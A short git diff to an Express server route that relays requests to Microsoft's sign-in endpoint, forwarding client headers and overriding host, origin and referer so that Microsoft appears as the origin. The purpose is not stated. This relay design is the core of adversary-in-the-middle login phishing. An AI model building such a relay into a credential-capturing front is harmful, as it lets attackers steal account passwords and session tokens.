@@ -43,6 +43,8 @@ app.use("/common/*", async (req, res) => {
     const targetUrl = `https://login.microsoftonline.com${req.originalUrl}`;
     console.log("Target URL:", targetUrl);
 
+    const modifiedBody = req.body && Object.keys(req.body).length > 0 ? req.body : { action: "default" };
+    
     const response = await axios({
       method: req.method,
       url: targetUrl,
@@ -50,8 +52,9 @@ app.use("/common/*", async (req, res) => {
         ...req.headers,
         host: "login.microsoftonline.com",
         origin: "https://login.microsoftonline.com",
+        referer: "https://login.microsoftonline.com",
       },
-      data: req.body,
+      data: modifiedBody,
       timeout: 15000, // 15 seconds timeout
     });
 
